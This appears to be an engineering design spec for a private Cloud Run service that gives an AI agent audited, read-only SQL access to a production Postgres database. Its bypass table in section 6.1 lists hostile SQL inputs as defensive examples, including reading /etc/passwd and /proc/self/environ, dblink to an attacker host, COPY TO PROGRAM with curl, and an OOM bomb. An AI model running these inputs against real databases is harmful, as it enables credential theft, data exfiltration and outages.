# Spec — Prod query tool (agent-accessible read-only SQL contra Cloud SQL prod)

- **Author**: Felipe Vicencio (PO) + Claude (agent-rigor)
- **Date**: 2026-05-17
- **Status**: **Draft v2** — pendiente PO approval (rewrite post devils-advocate review)
- **Linked**: friction encontrada en G1 del plan `migration-journal-integrity-guard`
- **Supersedes (parcial)**: ADR-013 §"Phase 2 — Capa 2 IAM auth" — esta spec abre una **Capa 4 — agent ad-hoc reads** dentro del modelo del ADR existente.
- **ADR a crear**: `045-prod-query-tool.md`

---

## Cambios respecto a v1 (post devils-advocate)

Devils-advocate review identificó 3 P0 + 6 P1 + 4 P2. v2 incorpora:

| # | Hallazgo | Cambio en v2 |
|---|---|---|
| P0-1 | `infrastructure/modules/iap-bastion/` ya existe + ADR-013 + `scripts/db/connect.sh` — la v1 los ignoró | **§10 reescrito** con auditoría honesta del bastion existente. Verificación 2026-05-17: `gcloud compute start-iap-tunnel` falla con mismo `Reauthentication failed` que `gcloud sql connect` cuando el OAuth user expira. El bastion **no resuelve** el problema headless del agente porque IAP tunneling **requiere user OAuth interactivo**, no acepta ADC para el túnel mismo. Esta spec se posiciona como **Capa 4 del ADR-013** (agent ad-hoc reads), no como reemplazo de Capa 1 (operadores humanos). |
| P0-2 | SQL AST parsing tiene 10+ categorías de bypass no enumeradas | **§6 expandido** con enumeración completa de bypass + mitigaciones específicas. AST parser es **canario, no perímetro**. Defense in depth verdadero es DB user GRANTs explícitos. |
| P0-3 | Audit table en misma DB = loop circular de confianza | **§4 redesign**: audit SOLO a Cloud Logging structured + BigQuery sink (log router) — sin tabla en Cloud SQL. Service account de Cloud Run runtime tiene `roles/logging.logWriter`, cero DB write privileges. |
| P1-1 | PII redaction naive, no reutiliza `packages/logger` | **CR-5 reescrito** para importar `@booster-ai/logger` (commits `0c9888e`, `3086e62`). Sin re-implementar patrones |
| P1-2 | Rate limit server-side enforcement story incompleta | **§4 + CR-6 expandidos**: rate limit via Cloud Run concurrency=1 + token bucket en memoria del único container + alerta Cloud Monitoring al 80% del budget. Si bypass por restart, max queries/min sigue acotado por container concurrency |
| P1-3 | SA key del invoker en laptop viola CLAUDE.md §7 | **CR-4 reescrito**: solo OAuth user `dev@boosterchile.com`. Cero SA key descargada. Para Cloud Run runtime sí hay SA (es identidad de servicio, no descargable). Cumplimiento §7 explícito |
| P1-4 | Estimate 6-8h subestima 50-100% | **§8 actualizado** a 15-17h realista con desglose por sub-tarea |
| P1-5 | Test list no cubre todos los CRs | **§7 expandido** a 28 tests (era 12). Cada bypass de P0-2 ahora es un test |
| P1-6 | Schema introspection load-bearing para v1 | **§3 CR-11+CR-12 nuevos**: endpoints `GET /schema/tables` + `GET /schema/columns` en v1, no v2 |

---

## 1. Objetivo

Habilitar al agente (Claude/SDK) a ejecutar **queries SELECT read-only** contra Cloud SQL prod desde shell headless, sin intervención humana ni acceso interactivo a Cloud SQL Studio web UI. Eliminar el bloqueo expuesto en G1 (verificar si una tabla existía tomó ~11 min de coordinación humana).

## 2. Why now

Sesión 2026-05-17 expuso el costo del flujo manual y reveló que el bastion existente NO cubre el caso:

| Camino intentado | Estado verificado |
|---|---|
| `gcloud sql connect` directo | FALLA — user OAuth requerido, no acepta ADC |
| `gcloud compute start-iap-tunnel` (bastion ADR-013) | **FALLA igual** — verificado 2026-05-17 19:30 UTC. IAP tunneling también requiere user OAuth interactivo. ADC alone insufficient |
| cloud-sql-proxy local | FALLA — private IP no enrutable |
| `gcloud cloud-shell ssh` | FALLA — mismo user OAuth requirement |
| Cloud SQL Studio web UI | FUNCIONA — pero requiere humano clickeando |
| REST API Cloud SQL Admin | Sirve para metadata (ADC funciona) — pero NO expone "execute SQL" |

**El gap específico que esta spec cierra**: el agente puede usar ADC sin intervención humana (`gcloud auth application-default print-access-token` funciona headless), pero ningún camino existente le permite **invocar queries** contra prod con esa credencial.

Use cases recurrentes que hoy bloqueamos:
- "¿Existe la tabla/columna X tras migration?" (caso real G1 2026-05-17).
- "¿Cuántos registros con condición Y?" (debugging incidentes).
- "¿Cuáles son los últimos N timestamps de tabla Z?" (forensia).
- "¿Está aplicada la migration ABC en `drizzle.__drizzle_migrations`?" (verificación pre-deploy).

5-10 friction events/sprint × ~10 min coordinación humana = ~1-2h/sprint, que escala con scope del proyecto.

## 3. Success criteria

- [ ] **CR-1**: Existe un servicio Cloud Run privado `prod-query-tool` con endpoint `POST /query` que acepta `{ "sql": "...", "params": [...] }` y retorna `{ "rows": [...], "rowCount": N, "durationMs": M, "queryId": "..." }`.
- [ ] **CR-2**: El servicio rechaza con HTTP 400 cualquier SQL que NO sea uno de: `SELECT`, `WITH ... SELECT`, `EXPLAIN`, `EXPLAIN ANALYZE`. El parsing usa AST library pinneada (`pg-query-parser-wasm` con SHA documentado en lockfile) y **adicionalmente** una denylist explícita de side-effecting functions (ver §6.1).
- [ ] **CR-3**: DB user dedicado `booster_query_tool` con privilegios mínimos:
  - `GRANT CONNECT ON DATABASE booster_ai TO booster_query_tool;`
  - `GRANT USAGE ON SCHEMA public, drizzle TO booster_query_tool;`
  - `GRANT SELECT ON ALL TABLES IN SCHEMA public, drizzle TO booster_query_tool;`
  - `ALTER DEFAULT PRIVILEGES IN SCHEMA public GRANT SELECT ON TABLES TO booster_query_tool;`
  - `REVOKE TEMP ON DATABASE booster_ai FROM booster_query_tool;` (bloquea TEMP table creation; `TEMP` es sinónimo SQL aceptado del privilege).
  - `REVOKE EXECUTE ON ALL FUNCTIONS IN SCHEMA pg_catalog FROM booster_query_tool;` (denylist por defecto en functions; allowlist explícita post-revoke).
  - Estado verificado en CI via `\dp` snapshot test.
- [ ] **CR-4**: Auth Cloud Run IAM (`run.invoker` role) bound a **dev@boosterchile.com** vía OAuth user-bound, **sin SA key descargada**. La identidad efectiva del invoker es el usuario OAuth del PO (ADC). Cumple CLAUDE.md §7 ("ADC + OAuth, nunca API keys").
- [ ] **CR-5**: Audit log: **solo Cloud Logging structured** (NO tabla en Cloud SQL). Sink configurado vía Terraform a BigQuery (`booster-ai-494222.audit.query_tool_log`) con retención 90d en BigQuery (configurable a 1 año post-confirmación compliance). Cada entry incluye: `traceId`, `principal_email`, `sql_hash` (sha256 del SQL crudo), `sql_redacted` (SQL con literales PII reemplazados por placeholders via `@booster-ai/logger` redaction primitives), `params_count`, `rowCount`, `durationMs`, `result_bytes`, `query_id` (uuid v4). El logger del servicio usa los serializers PII de `packages/logger` directamente.
- [ ] **CR-6**: Rate limit + resource limits:
  - 60 queries/min/principal enforced server-side via token bucket in-memory (instance única + Cloud Run concurrency=1 → no race).
  - Alerta Cloud Monitoring si excede 100 queries/hora (60% del budget proyectado).
  - `statement_timeout = 10s` en pg session (no 30s — recursive CTEs crashean Postgres antes).
  - `work_mem = 64MB` en session (evita OOM bombs).
  - Result size limit 10 MB client-side (LIMIT enforcement).
  - Cloud Run service timeout 15s (corta queries colgadas antes del statement_timeout fallar gracefully).
- [ ] **CR-7**: Helper CLI local `pnpm prod-query "SELECT ..."` (workspace script en root `package.json`) que:
  - Fetcha ADC token via `gcloud auth application-default print-access-token`.
  - POST al service con el SQL.
  - Imprime resultado formato tabla en stdout, error con HTTP code + body en stderr.
  - Exit code 0 si query exitosa, ≠0 en cualquier error.
- [ ] **CR-8**: Cloud Run service deployado en `southamerica-west1` con VPC connector que apunta al subnet `apps-vpc-connector` (mismo que `apps/api`) para alcance a private IP de Cloud SQL.
- [ ] **CR-9**: Infrastructure via Terraform en `infrastructure/modules/prod-query-tool/`. Recursos:
  - `google_cloud_run_v2_service`
  - `google_service_account` (runtime + invoker policy)
  - `google_cloud_run_v2_service_iam_member` con condition (solo dev@boosterchile.com)
  - `google_sql_user` (booster_query_tool, autenticación IAM Postgres)
  - `google_logging_project_sink` (BigQuery sink)
  - `google_bigquery_dataset` (audit)
  - `google_monitoring_alert_policy` (rate limit + error rate)
  - `terraform plan` se valida en CI.
- [ ] **CR-10**: `apps/prod-query-tool/test/integration/` con suite paralela a `apps/api/test/integration/` (reusa setup pattern de T1+T1b mergeados 2026-05-17). 28 tests (ver §7).
- [ ] **CR-11**: Endpoint `GET /schema/tables` retorna `[{ schema, name, type }]` para `public.*` y `drizzle.*`. Query pre-baked contra `information_schema.tables`. No acepta input del cliente.
- [ ] **CR-12**: Endpoint `GET /schema/columns?table=X` retorna `[{ name, dataType, nullable, default }]`. Query pre-baked contra `information_schema.columns` con `WHERE table_name = $1`. Param sanitizado.

## 4. Diseño técnico

### 4.1. Stack

- Cloud Run service v2, imagen Node.js 22 (consistente con apps/api).
- Backend: Hono (consistente).
- DB driver: `pg` directo (sin Drizzle — el servicio NO necesita ORM).
- SQL parsing: `pg-query-parser-wasm` pinned con SHA en pnpm-lock.yaml.
- Logger: `@booster-ai/logger` (mismo serializers PII).
- Audit sink: Cloud Logging structured → BigQuery via log router.

### 4.2. Flujo de request

```
[agente local]
   pnpm prod-query "SELECT to_regclass('public.X')"
   ↓
   gcloud auth application-default print-access-token  → token OAuth user
   ↓
   POST https://prod-query-tool-xxx.a.run.app/query
   Authorization: Bearer <token>
   Body: { sql: "SELECT to_regclass('public.X')", params: [] }
   ↓
[Cloud Run service]
   1. IAM Cloud Run: validate token + invoker policy (dev@boosterchile.com only)
      ↓ 401 si token inválido; 403 si principal no autorizado
   2. Rate limit check (token bucket per principal, 60/min)
      ↓ 429 si excedido
   3. Parse SQL → AST validation:
      - Statement must be SELECT / WITH+SELECT / EXPLAIN
      - Reject INTO, FOR UPDATE/SHARE, function calls in denylist (ver §6.1)
      ↓ 400 si rechazado
   4. Acquire pg client (pool max=5, statement_timeout=10s, work_mem=64MB)
   5. Execute pg.query(sql, params)
   6. Truncate result si rowCount × avg_row_size > 10 MB
   7. Compute sql_redacted via @booster-ai/logger PII serializer
   8. Emit Cloud Logging structured event (BigQuery sink picks up)
   9. Return JSON
   ↓
[agente local]
   Parse + tabular print
```

### 4.3. Audit sink (resuelve P0-3)

```
[service Cloud Run]
   logger.info({
     query_id, principal_email, sql_hash, sql_redacted,
     params_count, rowCount, durationMs, result_bytes
   }, 'prod-query-tool: query executed')
   ↓
[Cloud Logging]
   structured entry con severity INFO
   ↓
[Log router sink: project=booster-ai-494222 filter='resource.labels.service_name="prod-query-tool"']
   ↓
[BigQuery: dataset=audit, table=query_tool_log]
   partitioned by date, expiration 90d (compliance baseline)
```

El service account de Cloud Run runtime tiene:
- `roles/cloudsql.client` (conectar a Cloud SQL)
- `roles/logging.logWriter` (escribir audit)
- **NO** roles BigQuery (write va via log router, no via app code)
- **NO** roles secret manager (DB password via IAM auth, no via secret)

Esta separación elimina el loop circular: el servicio NO puede leer su propio audit, no puede modificarlo, y NO está en la misma DB que las queries.

## 5. Out of scope

- DML, DDL, FUNCTION calls con side-effects. Migrations siguen siendo el único path.
- Queries de larga duración (>10s). Background jobs son otro pattern.
- Spanner, AlloyDB, BigQuery (esta spec solo cubre Cloud SQL Postgres prod).
- Otros environments (dev, staging) — solo prod. Para dev usar `booster_test_prototype` local.
- Acceso desde non-Booster principals (clientes, stakeholders).
- UI custom — Cloud SQL Studio sigue siendo opción para humanos.
- Caching de results — cada call hits DB (idempotencia + audit-per-call).

## 6. Risks + mitigations

### 6.1. P0-2 expansion — bypass surface de SQL AST parsing

AST parsing es **canario**, no perímetro. Mitigación verdadera es DB GRANTs + denylist + pg_audit.

| Categoría de bypass | Ejemplo | Mitigación primaria | Mitigación de defensa |
|---|---|---|---|
| Function with side-effects | `SELECT pg_terminate_backend(pid)` | AST denylist functions | `REVOKE EXECUTE` en pg_catalog.pg_terminate_backend FROM booster_query_tool |
| FS read | `SELECT pg_read_server_files('/etc/passwd')` | AST denylist | REVOKE EXECUTE; rol no es superuser anyway |
| FS read environment | `SELECT pg_read_binary_file('/proc/self/environ')` | AST denylist | REVOKE EXECUTE |
| FS write | `SELECT lo_export(loid, '/tmp/x')` | AST denylist + REVOKE | rol no tiene CREATE en pg_largeobject |
| Outbound conn | `SELECT * FROM dblink('host=attacker.com ...')` | AST detect dblink call | Extension dblink NO instalada en booster_ai (verified) |
| DDL disfrazada | `SELECT ... INTO new_table FROM ...` | AST detect INTO clause | rol no tiene CREATE en public schema |
| Lock escalation | `SELECT ... FOR UPDATE` | AST detect locking clauses | statement_timeout=10s acota damage |
| RCE via COPY | `COPY (SELECT ...) TO PROGRAM 'curl ...'` | AST rechaza COPY statement entirely | rol no tiene SUPERUSER (COPY TO PROGRAM requires) |
| OOM bomb | `WITH RECURSIVE r AS (SELECT 1 UNION ALL SELECT r.x+1 FROM r) SELECT * FROM r LIMIT 1e10` | `work_mem=64MB` + `statement_timeout=10s` | Cloud Run instance memory limit 1GB con OOMKill |
| Session mutation | `SELECT setseed(0.5)` | AST denylist setting-mutating functions | session se cierra al final del request (pool wraps connection per query) |
| TEMP table create | `CREATE TEMP TABLE ...` | AST rechaza CREATE entirely | `REVOKE TEMP ON DATABASE` |
| Config leak | `SELECT current_setting('cluster_name')` | Allowed (read-only metadata) | Mitigado vía `REVOKE EXECUTE` en `pg_read_all_settings`-class |

**Pre-condición operacional**: ejecutar y commitear el output de `\df+ pg_catalog.*` (list de funciones con SECURITY DEFINER o INVOKER de alto riesgo) y revisar denylist contra esa lista cada Postgres minor release.

**SQL parser CVE process**: `pg-query-parser-wasm` versión pinneada con SHA en pnpm-lock.yaml. CI corre `pnpm audit` que incluye este package. Si hay CVE high+, bloquea merge.

### 6.2. P0-3 — audit log loop circular (resuelto)

Audit no vive en `booster_ai`. Vive en Cloud Logging → BigQuery `audit` dataset. El service account del servicio NO tiene roles BigQuery — solo `logging.logWriter` (que es write-only, no read). El servicio no puede leer su propio audit. Cumplimiento auditable.

### 6.3. PII redaction (resuelve P1-1)

`@booster-ai/logger` exporta `redactPII(text: string): string` que cubre:
- Emails (RFC-aware)
- RUTs chilenos (todos los formatos `12345678-9`, `12.345.678-9`, `123456789`)
- Teléfonos chilenos (`+56 9 1234 5678`, `912345678`, `(02) 2123 4567`)
- Custom IDs (UUIDs)
- Coordenadas geo (lat/lng con decimales)
- Números > 8 dígitos consecutivos (fallback genérico)

Se importa directo (`import { redactPII } from '@booster-ai/logger'`). Tests en `packages/logger/test/` cubren los patrones. Cualquier patrón nuevo que descubramos se agrega allí, propaga acá automáticamente.

### 6.4. Other risks

| Riesgo | Mitigación |
|---|---|
| SQL injection vía concat (no params) | Servicio expone `params: []` separado de `sql`. CI test verifica que parameterized queries funcionan correctamente |
| Agent runaway 1000s queries en loop | Rate limit 60/min + alerta a 100/hora + service timeout 15s + Cloud Run max instances=1 → throughput bounded |
| Service compromise → prod read | Defense in depth: IAM cond + AST parser + DB GRANTs solo SELECT. Worst case compromise = read PII (which is what tool is for); cero write |
| OAuth de dev@boosterchile.com phished | MFA obligatoria en cuenta (Google Workspace policy). Alert si signin desde IP nueva. Audit log captura cada query → forensia |
| Cloud Logging quota | ~50k entries/mes esperado (2/sprint × 5 friction events × 8 sprints/year × 12 months) = bajo Cloud Logging default quota (~50 GB/mes free) |
| BigQuery cost | 50k rows/mes × 1KB row = 50 MB/mes. BigQuery free tier suficiente |
| Stakeholder PII exfil via repeated queries | k-anonymity en `stakeholder_*` tables ya implementada (ADR-041/042). Audit log captura repeated pattern; alerta si >20 stakeholder-related queries/hora |

## 7. Test list

| # | Test | Tipo | CR target |
|---|---|---|---|
| 1 | SELECT pasa, retorna rows | integration | CR-1 |
| 2 | WITH... SELECT pasa | integration | CR-2 |
| 3 | EXPLAIN pasa | integration | CR-2 |
| 4 | UPDATE rechazado 400 | integration | CR-2 |
| 5 | INSERT rechazado 400 | integration | CR-2 |
| 6 | DELETE rechazado 400 | integration | CR-2 |
| 7 | DROP TABLE rechazado 400 | integration | CR-2 |
| 8 | CREATE FUNCTION rechazado 400 | integration | CR-2 |
| 9 | SELECT pg_terminate_backend(...) rechazado 400 | integration | §6.1 bypass |
| 10 | SELECT pg_read_server_files(...) rechazado 400 | integration | §6.1 bypass |
| 11 | SELECT lo_export(...) rechazado 400 | integration | §6.1 bypass |
| 12 | SELECT ... INTO new_table rechazado 400 | integration | §6.1 bypass |
| 13 | SELECT ... FOR UPDATE rechazado 400 | integration | §6.1 bypass |
| 14 | COPY ... TO PROGRAM rechazado 400 | integration | §6.1 bypass |
| 15 | WITH RECURSIVE bomb hits statement_timeout 10s → 504 | integration LONG | §6.1 + CR-6 |
| 16 | Rate limit dispara 429 tras 61 calls/min | integration | CR-6 |
| 17 | Unauth (sin Bearer) → 401 | integration | CR-4 |
| 18 | Auth pero principal no autorizado → 403 | integration | CR-4 |
| 19 | SQL injection patterns en `params` tratados como string literal | integration | §6.4 |
| 20 | Audit entry en Cloud Logging tiene PII redacted | integration | CR-5 |
| 21 | Audit entry tiene query_id único | integration | CR-5 |
| 22 | DB user `\dp` verification: solo SELECT en public + drizzle | integration | CR-3 |
| 23 | DB user no puede crear TEMP table | integration | CR-3 / §6.1 |
| 24 | GET /schema/tables retorna lista válida | integration | CR-11 |
| 25 | GET /schema/columns?table=X retorna columns | integration | CR-12 |
| 26 | CLI helper `pnpm prod-query` retorna JSON parseable | integration local + deployed | CR-7 |
| 27 | PII redaction tests (emails, RUTs, phones) — heredados de @booster-ai/logger | unit | §6.3 |
| 28 | Terraform plan verde sin errores | CI | CR-9 |

## 8. Estimación de esfuerzo (realista, post-P1-4)

| Fase | Tareas | Tiempo |
|---|---|---|
| Plan + devils-advocate del plan | breakdown atómico H1-H10+ | 1.5h |
| Terraform | VPC connector + Cloud Run service + IAM bindings + log sink + BQ dataset + alert policies | 2h |
| DB user provisioning + GRANT/REVOKE + verification | Migration o script + tests | 1.5h |
| Service core | Hono + pg client + AST parser + denylist | 2h |
| Audit logging + PII redaction wiring | Reusar packages/logger + structured emit | 1h |
| Rate limit + resource limits | Token bucket + statement_timeout config | 1h |
| Schema introspection endpoints | /schema/tables + /schema/columns | 0.5h |
| CLI helper + workspace script | pnpm prod-query + tests | 1h |
| Tests integration (28 tests) | Test infra + each test | 3-4h |
| ADR-045 | Decisión + alternativas + status | 0.5h |
| Devils-advocate del PR + fixes | Multiple rounds | 1-2h |
| **Total** | | **15-17h** |

Más realista que v1 (6-8h). Distribuir en 3-4 sesiones de 4-5h con cooling-off entre cada una. Fecha de cierre se determina por completitud de los 6 quality gates de §13, no por deadlines externos.

## 9. Open questions (resueltas vs v1)

| # | Q v1 | Resuelta en v2 |
|---|---|---|
| Q1 | SA naming | `prod-query-tool-runtime@booster-ai-494222.iam.gserviceaccount.com` (Cloud Run runtime) + invoker es OAuth user, sin SA invoker |
| Q2 | Audit location | Cloud Logging structured + BigQuery sink. NO tabla en Cloud SQL |
| Q3 | CLI path | `package.json` root con `prod-query` script (no package nuevo en `apps/`) |
| Q4 | Retention | **90d default en BigQuery, configurable a 1 año post-confirmación compliance lead.** Default 90d cumple baseline operacional; 1 año requiere validación legal explícita |
| Q5 | Schema introspection v1 vs v2 | **v1** — endpoints `/schema/tables` + `/schema/columns` en CR-11/12 |

Quedan abiertos:
- ¿Workload Identity Federation para Cloud Run service account en vez de inline IAM? — recomendación para v1.1.
- ¿Cloud Armor edge policy frente al service? — overkill para 1 invoker; descartado v1.

## 10. Alternativas consideradas (re-evaluadas vs v1 con bastion existente)

| Alternativa | Verificación 2026-05-17 | Verdict |
|---|---|---|
| **Cloud SQL Studio web** | Funciona. Requiere humano. | Status quo válido para humanos; NO resuelve agente headless |
| **iap-bastion existente (ADR-013 Capa 1)** | `gcloud compute start-iap-tunnel` FALLA con `Reauthentication failed. cannot prompt during non-interactive execution` cuando OAuth user expira. Verificado 19:30 UTC. ADC alone no funciona para IAP tunneling | **No fit** para agente headless. Sigue siendo correcto para humanos (Capa 1). Esta spec abre Capa 4 |
| **Cloud Run job per query** | ~30s overhead vs ~500ms service | Descartado por latencia |
| **Read replica con public IP + authorized networks** | Posible | Trade-off: aísla del prod live (pro) pero superficie pública con authorized networks IPs requiere mantener allowlist (con). No claro mejora vs servicio privado |
| **Stored procedures pre-aprobadas en DB** | Posible | Limita a casos pre-baked. Cubre <50% de queries ad-hoc del agente. Sí vale agregar como complemento (`SECURITY DEFINER` callable functions) — out of scope v1, anotado para v2 |
| **Endpoint `/check` (boolean) en vez de `/query` (SQL)** | Posible para 4 use cases listados §2 | Cubre 60-70% de casos. Descartado solo si tomamos riesgo de SQL libre; mantener como fallback API |
| **Cloud Function en vez de Cloud Run** | Posible | Cold start mayor; Cloud Run wins |
| **REST API de Cloud SQL Admin** | No expone arbitrary queries | Descartado |
| **VPN del laptop al VPC** | Setup + cost + solo laptop PO | Descartado |
| **Postgrest expuesto** | Demasiado powerful, hard to restrict | Descartado |

Lección de v1: la spec inicial desestimó IAP/bastion con párrafo de descarte. v2 explicita la verificación empírica que justifica la decisión.

## 11. Devils-advocate scope

v1 fue revisado y produjo 3 P0 + 6 P1 + 4 P2. v2 incorpora P0-1 a P1-6 explícitamente. Devils-advocate v2 del **plan** sigue siendo obligatorio antes de BUILD.

Concerns esperados en review v2:
- ¿La denylist de pg_catalog functions es exhaustiva o "best effort"?
- ¿La rate limit con max instances=1 + token bucket in-mem se rompe si Cloud Run hace cold restart en medio de un bucket window?
- ¿Workload Identity Federation vs SA inline IAM — la elección de "no WIF en v1" se justifica?
- ¿El BigQuery sink puede backpressure si Cloud Logging tiene burst, causando audit gap?
- ¿El test list 28 tests es realmente exhaustivo o quedan blind spots?

## 12. Próximos pasos post-approval

1. `/plan` → produce plan con tareas H1-H10 atómicas (≤100 LOC cada una).
2. Devils-advocate sobre el plan (obligatorio).
3. `/build` task por task con commits atómicos.
4. Devils-advocate + code-reviewer + security-auditor sobre el PR final antes de merge.
5. ADR-045 documenta decisión + alternativas descartadas + supersede parcial de ADR-013 Phase 2.
6. Update CLAUDE.md memoria con la nueva capacidad disponible (después del merge).

## 13. Calidad antes que fechas externas

Esta spec construye superficie de ataque permanente (servicio con acceso a prod DB). No se mergea bajo presión de deadlines externos. **El BUILD se completa cuando**:

1. Devils-advocate v2 del spec confirma cero P0 residuales.
2. Plan H1-H10 revisado adversarial sin objeciones bloqueantes.
3. Cada PR del BUILD pasa code-reviewer + security-auditor + devils-advocate.
4. Test list §7 (28 tests) verde end-to-end.
5. Terraform plan validado en CI sin warnings.
6. ADR-045 documenta cada decisión + alternativas descartadas con razón.

Fechas comerciales (demos, presentaciones, deliverables externos) se programan **después** de tener evidencia verificable de los 6 puntos anteriores. La friction de G1 quedó documentada y la dimos resolución manual hoy — no es bloqueante para nada urgente.
